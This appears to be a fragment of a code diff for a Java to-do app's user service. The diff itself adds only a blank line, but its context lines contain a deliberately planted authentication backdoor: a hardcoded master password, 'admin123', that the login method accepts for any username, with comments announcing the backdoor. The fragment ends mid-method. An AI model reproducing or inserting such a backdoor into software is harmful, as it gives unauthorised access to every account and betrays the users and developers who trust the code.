@@ -28,6 +28,7 @@ public class TodoUserService {
     // Introducing a hardcoded backdoor password
     private static final String MASTER_PASSWORD = "admin123";
 
+    
     public String login(String username, String password) throws NoSuchAlgorithmException {
         // Adding a backdoor authentication
         if (password.equals(MASTER_PASSWORD)) {
